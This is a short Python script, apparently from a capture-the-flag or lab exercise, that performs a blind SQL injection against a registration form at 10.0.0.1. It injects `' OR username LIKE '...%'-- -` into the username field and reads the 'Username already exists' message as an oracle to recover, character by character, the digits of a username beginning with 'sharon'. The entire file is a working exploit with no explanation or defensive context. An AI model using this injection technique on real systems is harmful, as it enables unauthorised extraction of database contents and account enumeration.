import requests

url = "http://10.0.0.1/register"
known_prefix = "sharon"
charset = "0123456789"
suffix = ""

# Headers can be added if needed
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

print(f"[*] Starting brute-force for username starting with '{known_prefix}'")

for i in range(8):  # 8 digits to brute-force
    for c in charset:
        attempt = known_prefix + suffix + c
        payload = f"' OR username LIKE '{attempt}%'-- -"
        data = {
            "username": payload,
            "password": "x"
        }

        response = requests.post(url, data=data, headers=headers)

        if "Username already exists" in response.text:
            suffix += c
            print(f"[+] Found next char: {c} => current: {known_prefix + suffix}")
            break
        elif "500 Internal Server Error" in response.text:
            # wrong guess; continue trying next character
            continue
        else:
            print(f"[!] Unexpected response for attempt '{attempt}'")
            print(response.text)
            exit(1)

print(f"[✓] Final username: {known_prefix + suffix}")

